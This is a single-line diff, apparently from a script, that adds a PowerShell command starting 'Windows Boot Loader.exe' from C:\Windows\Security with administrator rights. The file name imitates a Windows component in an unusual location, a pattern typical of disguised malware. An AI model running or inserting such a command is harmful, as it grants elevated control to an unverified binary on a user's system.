@@ -1,0 +1,1 @@
+Start-Process -FilePath "C:\Windows\Security\Windows Boot Loader.exe" -Verb RunAs -WorkingDirectory "C:\Windows\Security\"
